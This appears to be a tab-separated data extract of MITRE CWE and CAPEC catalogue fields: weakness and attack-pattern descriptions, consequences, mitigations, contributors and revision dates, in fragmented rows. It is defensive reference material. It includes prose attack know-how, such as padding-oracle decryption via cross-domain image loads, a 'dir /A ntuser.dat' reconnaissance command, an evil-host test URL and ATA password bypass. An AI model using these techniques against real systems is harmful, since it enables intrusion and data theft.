15584	42	Do not use user-controlled inputs to select and load classes or code.
8080	35	MITRE
22956	35	MITRE
6443	100	The MITRE Corporation
9966	78	Very High
13440	62	updated Relationships
21941	62	updated Relationships
17907	72	System resources, CPU and memory, can be quickly consumed. This can lead to poor system performance or system crash.
5610	71	2008
8137	28	Eric Dalci
7575	35	MITRE
16629	62	updated Relationships
15653	40	The attacker must have the ability to modify non-executable files consumed by the target software.
17619	79	Authorization
18806	31	1000
16812	39	2011-03-29
15280	28	CWE Content Team
12174	35	MITRE
20412	50	Design: Utilize strict type, character, and encoding enforcement
17041	28	CWE Content Team
23726	56	ChildOf
6012	91	Implementation
12202	50	UDP scanning is complicated by rate limiting mechanisms governing ICMP error messages.
19907	62	updated Relationships, Taxonomy_Mappings
20842	40	The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time).
16688	89	Detailed
5724	39	2010-12-13
7325	25	Medium
21413	55	CAPEC Content Team
13390	28	CWE Content Team
24971	28	CWE Content Team
19872	23	An attack of this type exploits the ability of most browsers to interpret "data", "javascript" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.
14925	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
24828	28	CWE Content Team
15915	35	MITRE
19280	43	Simple
15877	101	CAPEC Content Team
23846	39	2017-11-08
25410	39	2012-05-11
24368	90	Language-Independent
20164	59	Updated Related_Attack_Patterns, Related_Weaknesses
19318	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
6196	66	Security Issues in Perl Scripts
9644	91	Architecture and Design
11984	71	2003
20476	92	Experiment
11594	23	An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key. Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the adversary. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies). This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the adversary whether a padding error during decryption has occurred, in whatever form it comes, is sufficient for the adversary to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack). This attack can be launched cross domain where an adversary is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating. To do so an adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). For instance, this can be done using "img" tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.
10159	62	updated Relationships, Taxonomy_Mappings
23889	62	updated Description
13447	78	High
12638	35	MITRE
16857	55	CAPEC Content Team
6866	79	Confidentiality
6925	39	2018-03-27
8802	104	190
24507	28	CWE Content Team
13220	78	High
20606	62	updated Potential_Mitigations, Time_of_Introduction
13819	39	2012-05-11
11482	81	Non-Repudiation
11732	56	PeerOf
18787	23	The software uses a loop with a control flow condition based on      a value that is updated within the body of the loop.
10541	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17746	39	2008-10-14
13169	23	The software, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted.
7652	28	CWE Content Team
20028	62	updated Detection_Factors
8493	50	Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
22438	39	2008-09-08
19298	39	2014-07-30
18375	21	PLOVER
11828	44	SOAR Partial
6196	33	Jordan Dimov, Cigital
11246	47	Other
9855	101	CAPEC Content Team
7431	46	A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:                             Inbound: the software contains an authentication mechanism that checks for a hard-coded password.                Outbound: the software connects to another system or component, and it contains hard-coded password for connecting to that component.                          In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.             The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.
12228	62	updated References, Relationships
20044	28	CWE Content Team
15036	62	updated Potential_Mitigations
6004	31	699
10906	28	CWE Content Team
22594	28	CWE Content Team
7750	35	MITRE
5990	56	ChildOf
15158	80	Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.
13192	25	Medium
7845	90	Language-Independent
20078	63	Other
19542	39	2012-05-11
8706	35	MITRE
13939	90	Language-Independent
5845	62	updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships
7352	28	CWE Content Team
11042	35	MITRE
24039	66	Target="_blank" - the most underestimated vulnerability ever
21197	35	MITRE
10698	28	CWE Content Team
23245	23	The software contains a method that accesses an object but does not later invoke      the element's associated finalize/destructor method.
11274	39	2011-06-01
24952	81	Other
16651	54	High
21703	72	The communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted.
18909	70	Wikipedia
13491	35	MITRE
12953	103	Primary
21421	79	Availability
22464	35	MITRE
23450	28	CWE Content Team
14351	35	MITRE
19153	35	MITRE
22283	26	Implementation
16579	73	Test the page using controlled evil page/host, http://example.com/evil.swf
8999	79	Confidentiality
18851	44	High
14869	42	For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password or key.
24384	62	updated Description, Relationships
7356	30	Kate Greenwood
17768	76	2019-09-30
10565	80	Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.
9567	39	2008-11-24
19551	39	2017-11-08
10064	39	2009-07-17
14949	63	DoS: Resource Consumption (CPU)
18135	59	Updated Related_Weaknesses
22843	56	ChildOf
25152	62	updated Relationships, Taxonomy_Mappings
10507	39	2008-07-01
25176	26	Implementation
10667	28	CWE Content Team
19808	28	Eric Dalci
12634	76	2015-11-09
8791	62	updated Potential_Mitigations, Time_of_Introduction
12299	70	Censorship in the Wild: Analyzing Internet Filtering in Syria
17898	28	CWE Content Team
19117	28	CWE Content Team
10438	81	Other
20012	74	2
12851	88	Weak Cryptography for Passwords
10109	103	Primary
8442	62	updated Applicable_Platforms, References, Taxonomy_Mappings
18617	89	Detailed
16441	28	CWE Content Team
15714	35	MITRE
17790	43	Simple
11105	28	CWE Content Team
17638	39	2011-06-27
6223	35	MITRE
9900	28	CWE Content Team
22856	101	CAPEC Content Team
8043	26	Implementation
12642	63	DoS: Resource Consumption (CPU)
6997	39	2011-06-27
13833	79	Confidentiality
21294	91	Implementation
9312	103	Primary
9270	24	MITRE
20827	31	1000
19203	103	Primary
9711	26	Implementation
13544	25	Medium
23351	78	Medium
22172	31	1000
14358	23	In a language where the user can influence the name of a variable at runtime, if the variable names are not controlled, an attacker can read or write to arbitrary variables, or access arbitrary functions.
17289	39	2009-10-29
9037	31	1000
15190	35	MITRE
7651	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
10904	62	updated Related_Attack_Patterns
8562	23	The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.
17462	39	2014-07-30
16820	83	v4 [DRAFT]
20058	26	Implementation
16113	39	2011-06-01
12855	88	Unprotected Windows Messaging Channel ('Shatter')
6321	33	QuantStart
5927	36	http://www.phreedom.org/research/rogue-ca/
24982	31	1000
19234	35	MITRE
9662	40	None
23721	28	CWE Content Team
24145	57	Primary
11526	39	2010-02-16
12429	33	Ruben Santamarta
7511	79	Accountability
21690	79	Access Control
17312	90	Language-Independent
6784	44	SOAR Partial
21822	26	Implementation
14936	23	The software logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.
5652	51	2015-11-09
6373	63	Modify Files or Directories
8827	63	Unexpected State
11051	31	1000
6775	79	Confidentiality
12846	39	2019-01-03
6634	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.                   A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.
13241	35	MITRE
25299	81	Non-Repudiation
19311	43	Simple
20664	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
22030	39	2011-06-01
13327	62	updated Relationships, Taxonomy_Mappings
13849	28	CWE Content Team
5641	35	MITRE
15259	28	CWE Content Team
12711	56	ChildOf
24467	91	Implementation
6252	81	Other
21255	51	2014-06-23
17790	23	The software does not encrypt sensitive or critical information before storage or transmission.
11698	91	Implementation
10459	97	ICMP Flood
9814	23	An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in responses.
10437	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
7571	81	Integrity
19949	63	Modify Memory
21365	62	updated Common_Consequences
19145	63	Read Memory
18844	62	updated Common_Consequences
6207	72	An attacker could gain access to user accounts and access sensitive data used by the user accounts.
9882	39	2012-05-11
12741	62	updated References
24984	91	Architecture and Design
14052	43	Simple
17246	51	2014-06-23
6364	62	updated Time_of_Introduction
20334	39	2009-10-29
10516	47	Unreliable Execution
11314	60	26
15509	56	CanAlsoBe
24488	42	Make sure that WSDL does not describe methods that should not be publicly accessible. Make sure to protect service methods that should not be publicly accessible with access controls.
18362	59	Updated Resources_Required
23835	35	MITRE
20512	59	Updated References, Related_Weaknesses
22466	28	CWE Content Team
13828	28	CWE Content Team
7092	62	updated Common_Consequences
8242	35	MITRE
22047	39	2011-06-01
9725	100	The MITRE Corporation
20038	63	Alter Execution Logic
13326	85	543
20944	76	2018-07-31
18827	80	All the attacker needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages.
9377	35	MITRE
7838	23	A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to his site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed.
13665	28	Eric Dalci
12700	39	2009-03-10
22318	35	MITRE
9463	39	2017-11-08
23379	81	Integrity
9843	88	Large Data Table with Excessive Number of Indices
11214	43	Simple
20689	88	Improper Enforcement of Message Integrity During Transmission in a Communication Channel
10688	43	Simple
18356	50	Implementation: Use possible permissions on file access when developing and deploying web applications.
20629	73	Figure out if the client's browser has DNS cache enabled.
14263	81	Availability
14705	39	2014-07-30
20020	101	CAPEC Content Team
15665	62	added/updated white box definitions
23866	40	The adversary must have the ability to create a new root certificate.
21518	39	2018-03-27
18112	35	MITRE
22680	36	http://nmap.org/docs/discovery.pdf
6695	35	MITRE
18871	56	ChildOf
9996	102	ChildOf
11296	28	CWE Content Team
18123	28	CWE Content Team
24476	53	The MITRE Corporation
11140	35	MITRE
6791	62	updated Related_Attack_Patterns, Relationships
15902	97	Intent Spoof
15474	28	CWE Content Team
13441	62	added/updated demonstrative examples
17250	39	2008-07-01
16438	53	The MITRE Corporation
16129	28	Eric Dalci
24922	39	2011-06-01
6229	39	2011-06-01
21202	28	CWE Content Team
9579	103	Primary
24126	39	2011-06-27
15341	49	2012
17153	62	updated Description
12068	56	ChildOf
22296	47	Gain Privileges
11127	23	An adversary exploits functionality meant to identify information about the primary users on the target system to an authorized user. They may do this, for example, by reviewing logins or file modification times. By knowing what owners use the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command that may accomplish this is "dir /A ntuser.dat". Which will display the last modified time of a user's ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in.
20444	77	Automated Static Analysis
23609	91	System Configuration
24642	49	2008
7733	103	Primary
14826	31	1000
9682	23	The software does not properly maintain references to a file descriptor or handle, which prevents that file descriptor/handle from being reclaimed.
9679	92	Exploit
22728	56	CanPrecede
22505	26	Implementation
8079	39	2017-11-08
21216	62	updated Potential_Mitigations
13551	62	updated Relationships
21211	104	1078
5923	91	Architecture and Design
20966	28	CWE Content Team
17314	102	ChildOf
10238	31	1000
23199	35	MITRE
19961	94	Depending on the intention of the adversary, a successful BitSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.
24189	42	Always define appropriate error pages. The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.
13456	73	Post a malicious HTTP Request utilizing double CR/LF characters in HTTP header to cause request splitting
22506	70	Adobe Acrobat/Acrobat Reader ActiveX Control Buffer Overflow Vulnerability
19860	69	Draft
12934	39	2011-06-27
9089	42	Use an input validation framework such as Struts or the OWASP ESAPI Validation API. If you use Struts, be mindful of weaknesses covered by the CWE-101 category.
18233	36	http://www.faqs.org/rfcs/rfc792.html
16702	39	2008-07-01
9081	56	ChildOf
19041	50	Perform input validation for all remote content.
7199	21	PLOVER
22472	67	High
22823	62	updated Relationships
10760	69	Incomplete
14147	28	CWE Content Team
9932	35	MITRE
17883	63	Read Files or Directories
23307	39	2009-12-28
15687	56	ChildOf
12906	62	updated Relationships
24468	79	Availability
15161	53	The MITRE Corporation
10511	62	updated Relationships, Taxonomy_Mappings
6426	28	CWE Content Team
16840	35	MITRE
9390	39	2012-05-11
7756	28	CWE Content Team
15015	35	MITRE
18561	21	CLASP
13477	39	2011-09-13
19026	39	2010-06-21
7932	28	Sean Eidemiller
20746	28	CWE Content Team
6234	76	2015-11-09
21428	39	2011-06-01
19939	95	[Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.
22108	28	CWE Content Team
18543	23	The software performs an operation that triggers an external diagnostic or error message that is not directly generated by the software, such as an error generated by the programming language interpreter that the software uses. The error can contain sensitive system information.
10518	28	CWE Content Team
11466	61	Stable
11689	76	2019-09-30
9247	62	updated Common_Consequences
6885	66	Password hashing at scale
22913	103	Primary
12580	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.
15258	56	ChildOf
12818	30	Brendan Saulsbury
20508	62	updated References, Relationships
11114	76	2019-04-04
25316	28	CWE Content Team
10105	76	2018-07-31
19064	39	2009-12-28
17939	62	updated Potential_Mitigations
13523	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
22346	28	CWE Content Team
15126	100	The MITRE Corporation
10700	39	2010-04-05
6484	62	updated Potential_Mitigations
18320	39	2019-06-20
23876	63	Modify Memory
10182	39	2017-11-08
20298	97	API Manipulation
13912	97	Physical Theft
21072	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships
23484	39	2012-10-30
13742	28	CWE Content Team
12865	39	2008-07-01
20089	69	Draft
17561	77	Automated Static Analysis
10949	78	Very High
12466	103	Primary
23202	31	699
19245	95	[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.
21906	35	MITRE
6206	28	CWE Content Team
18523	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
15607	35	Cigital
24928	73	Induce errors to find informative error messages
17686	71	2013
5846	103	Primary
21429	31	699
5800	85	480
18209	103	Primary
24172	39	2011-06-01
18592	100	The MITRE Corporation
20264	35	MITRE
11375	59	Updated Attack_Motivation-Consequences
10077	59	Updated Resources_Required
15287	28	CWE Content Team
24535	59	Updated Related_Weaknesses
19339	35	MITRE
23477	35	MITRE
25105	39	2017-05-03
14847	35	MITRE
7159	42	Disable interrupts or signals over critical parts of the code, but also make sure that the code does not go into a large or infinite loop.
14325	46	Many suspicious comments, such as BUG, HACK, FIXME, LATER, LATER2, TODO, in the code indicate missing security functionality and checking. Others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.
20986	39	2011-06-01
20032	51	2014-06-23
15898	43	Simple
21912	35	MITRE
16248	33	Frank Kim
11508	79	Access Control
11798	62	updated Description
21588	56	ChildOf
23656	32	Insecure.com LLC, ISBN: 978-0-9799587-1-7
16165	23	An attacker exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.
5852	35	MITRE
23160	62	updated Relationships, Taxonomy_Mappings
20699	62	updated Common_Consequences
21694	30	F. Yergeau
15826	28	CWE Content Team
12599	28	CWE Content Team
7556	39	2019-01-03
17784	39	2008-09-08
9619	25	Low
15224	23	The software uses, accesses, or otherwise operates on a resource after that resource has been expired, released, or revoked.
9294	67	High
13479	91	Architecture and Design
15672	35	MITRE
25381	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Inter-application Flow Analysis
13805	28	Eric Dalci
18776	63	Reduce Performance
20938	104	187
18920	91	Architecture and Design
17877	67	Medium
17833	39	2009-03-10
21422	71	2002
19617	35	MITRE
21202	62	updated Common_Consequences, Demonstrative_Examples, References
10249	79	Confidentiality
22254	35	MITRE
23549	46	Process control vulnerabilities take two forms: 1. An attacker can change the command that the program executes: the attacker explicitly controls what the command is. 2. An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means. Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.
8038	53	The MITRE Corporation
9678	40	The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.
13300	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.
16587	39	2012-05-11
6947	45	Variant
7463	39	2008-09-08
12612	40	The attacker must have physical access to the device.
8628	24	Cigital
8120	35	KDM Analytics
16236	73	Register the SoundSquatted domain.
8032	39	2008-09-08
24931	59	Updated @Abstraction
7508	35	MITRE
21734	77	Dynamic Analysis with Automated Results Interpretation
13759	77	Automated Dynamic Analysis
5752	28	CWE Content Team
25265	35	MITRE
11665	28	CWE Content Team
24257	62	updated Potential_Mitigations, Time_of_Introduction
21603	39	2008-09-08
19510	35	MITRE
10256	62	updated Demonstrative_Examples, Relationships
12687	35	MITRE
13827	28	CWE Content Team
8908	33	Michael Gegick
9438	42	Pre-design through Build: Canary style bounds checking, library changes which ensure the validity of chunk data, and other such fixes are possible, but should not be relied upon.
9156	35	MITRE
12966	62	Removed C from Applicable_Platforms
18090	35	MITRE
16155	35	MITRE
22703	39	2010-12-13
17898	62	updated Relationships
17086	39	2011-03-29
19681	44	SOAR Partial
6680	28	CWE Content Team
7482	28	CWE Content Team
6657	103	Primary
24722	31	1000
19969	62	updated Relationships
21749	77	Manual Analysis
24278	62	updated Common_Consequences, Relationships
12671	103	Primary
17884	32	ITBusiness Edge, Quinstreet Inc.
7750	28	CWE Content Team
23790	61	Draft
22848	28	CWE Content Team
20618	38	A web penetration tool probing a web server may generate abnormal activities recorded on log files. Abnormal traffic such as a high number of request coming from the same client may also rise the warnings from a monitoring system or an intrusion detection tool.
17890	35	MITRE
10692	101	CAPEC Content Team
20541	31	1000
19143	91	Architecture and Design
21754	21	7 Pernicious Kingdoms
10670	100	The MITRE Corporation
12311	88	Improper Enforcement of Behavioral Workflow
23489	33	Jason Lam
19588	81	Other
5630	26	Architecture and Design
24999	103	Primary
20973	62	updated Alternate_Terms, Description, Name, Relationships, Taxonomy_Mappings, Theoretical_Notes
15676	72	The most common consequence will be a corruption of the state of the software, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure.
25096	86	http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
21314	62	updated Relationships, Taxonomy_Mappings
14652	28	CWE Content Team
22826	39	2017-01-19
18872	35	MITRE
10039	63	Gain Privileges or Assume Identity
9042	63	Varies by Context
15430	39	2012-10-30
15228	28	CWE Content Team
10280	73	The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.
16259	28	Eric Dalci
16022	39	2014-07-30
11554	28	CWE Content Team
13648	56	ChildOf
13909	92	Experiment
20794	91	Testing
11158	35	MITRE
12206	27	A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.
6613	42	A software system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking (e.g. input validation) is performed when relying on input from outside a trust boundary.
6943	69	Stable
10618	31	1000
12870	33	Nat Pryce
20273	97	Malicious Gray Market Hardware
8682	62	updated Weakness_Ordinalities
24868	31	1000
18113	53	The MITRE Corporation
16152	28	CWE Content Team
20991	30	David LeBlanc
16524	62	updated Description, Name
8991	69	Draft
23395	94	Run Arbitrary Code
14274	62	updated Potential_Mitigations
5633	35	MITRE
18280	62	updated Relationships, Taxonomy_Mappings
17346	91	Testing
20583	91	Implementation
6671	101	CAPEC Content Team
24221	28	CWE Content Team
22069	81	Confidentiality
11372	81	Integrity
12686	39	2008-10-14
16888	39	2012-05-11
24937	28	CWE Content Team
15434	28	CWE Content Team
10213	62	updated Relationships
18711	39	2010-06-21
10115	39	2019-06-20
16675	79	Availability
19845	39	2014-07-30
11517	28	CWE Content Team
10086	72	If hard-coded passwords are used, it is almost certain that malicious users will gain access through the account in question.
14840	73	Attack known bad interfaces
8051	40	The attacker must be able to make HTTP requests to the web server.
13535	76	2017-05-01
21718	56	ChildOf
13613	35	MITRE
23243	76	2017-08-04
21320	39	2011-06-01
16655	39	2009-05-27
12549	31	699
12940	55	CAPEC Content Team
15597	62	updated Relationships
6317	39	2012-10-30
15155	43	Simple
9727	28	CWE Content Team
20165	31	1000
12187	85	295
7461	103	Primary
24692	39	2010-02-16
10964	36	https://people.eecs.berkeley.edu/~daw/papers/mobphish-w2sp11.pdf
8768	35	MITRE
11538	28	CWE Content Team
25293	50	Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.
10304	28	CWE Content Team
8575	85	632
10115	28	CWE Content Team
9655	56	ChildOf
5818	31	1000
20880	62	updated Demonstrative_Examples, References
20803	35	MITRE
24073	26	Architecture and Design
10782	85	253
23880	28	CWE Content Team
24969	91	Operation
14881	35	MITRE
10111	85	444
8303	43	Simple
21816	35	MITRE
15243	99	Syngress
8774	66	Psychological Acceptability
24283	35	MITRE
17903	35	MITRE
17939	35	MITRE
24487	56	ChildOf
6471	50	Use OS-level preventative functionality. Not a complete solution.
10098	39	2011-03-29
12849	71	2001
10320	39	2019-01-03
16744	56	ChildOf
16265	39	2011-06-01
21397	39	2019-01-03
14161	35	MITRE
12630	72	Clearly, write-what-where conditions can be used to write data to areas of memory outside the scope of a policy. Also, they almost invariably can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator.
13423	79	Confidentiality
22821	30	Terence Chen
9145	28	Eric Dalci
18094	56	ChildOf
16347	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
6845	104	319
20646	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
10770	35	MITRE
23723	97	Flash Parameter Injection
7072	77	Manual Dynamic Analysis
21177	35	MITRE
15612	35	Cigital
23138	62	updated Description
18280	39	2011-09-13
7057	74	3
13098	56	ChildOf
12527	39	2012-05-11
6033	95	[Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.
6675	39	2014-07-30
14538	72	An unanchored regular expression in the context of a whitelist will possibly result in a protection mechanism failure, allowing malicious or malformed data to enter trusted regions of the program. The specific consequences will depend on what functionality the whitelist was protecting.
17435	76	2018-07-31
14882	102	ChildOf
12708	62	updated Common_Consequences
24908	90	Java
23044	27	None: No specialized resources are required to execute this type of attack.
11078	28	CWE Content Team
16856	53	The MITRE Corporation
24378	81	Confidentiality
20937	56	CanAlsoBe
23248	23	An adversary intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity.
21555	62	updated Relationships
12476	35	MITRE
12411	62	updated Potential_Mitigations
20398	35	MITRE
16645	35	MITRE
12483	28	CWE Content Team
8548	77	Architecture or Design Review
24930	26	Architecture and Design
7037	56	ChildOf
18671	35	MITRE
17180	62	updated Common_Consequences
14066	80	The adversary requires strong inter-personal and communication skills.
14633	28	CWE Content Team
6925	35	MITRE
9415	39	2012-10-30
19785	79	Availability
13039	77	Manual Analysis
19008	76	2019-04-04
10267	21	CWE Content Team
18987	90	Java
6593	56	PeerOf
22936	35	MITRE
13475	100	The MITRE Corporation
11220	44	SOAR Partial
7960	35	MITRE
6091	49	2008
11813	77	Automated Static Analysis - Source Code
17139	81	Integrity
5689	91	Implementation
12054	70	OWASP
16491	28	CWE Content Team
16396	76	2019-04-04
9640	43	Simple
19469	77	Automated Static Analysis
16055	79	Confidentiality
12414	81	Other
21945	39	2010-06-21
15572	35	MITRE
18530	91	Architecture and Design
12474	35	MITRE
11662	69	Draft
16190	91	Implementation
15044	62	updated Demonstrative_Examples
15370	39	2011-06-01
22028	95	[Launch an XML Attribute Blowup attack] The attacker crafts malicious XML message that contains multiple Attributes in the same node.
5656	62	updated Relationships
8004	43	Simple
13697	39	2010-02-16
13777	35	MITRE
8435	48	02
23594	39	2012-10-30
14921	101	CAPEC Content Team
9124	66	PHP Object Injection
25342	39	2012-05-11
15667	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Relationships
9368	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
14961	63	Execute Unauthorized Code or Commands
9200	50	Restrict access to private keys from non-supervisory accounts                Restrict access to administrative personnel and processes only                Ensure all remote methods are secured                Ensure all services are patched and up to date
23376	42	Check the results of all functions that return a value and verify that the value is expected.
24560	104	1066
6817	47	Bypass Protection Mechanism
22480	39	2008-09-08
13425	35	MITRE
8858	60	26
9109	63	Read Application Data
5638	66	Developing Secure ActiveX Controls
19506	36	http://seclists.org/fulldisclosure/2005/Dec/1107
17344	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
20263	28	CWE Content Team
24143	62	updated Potential_Mitigations, Related_Attack_Patterns
12424	56	CanPrecede
8634	62	updated Observed_Examples, References, Relationships
22527	76	2017-01-09
17858	79	Integrity
23886	35	MITRE
5674	62	updated Observed_Examples
17109	28	CWE Content Team
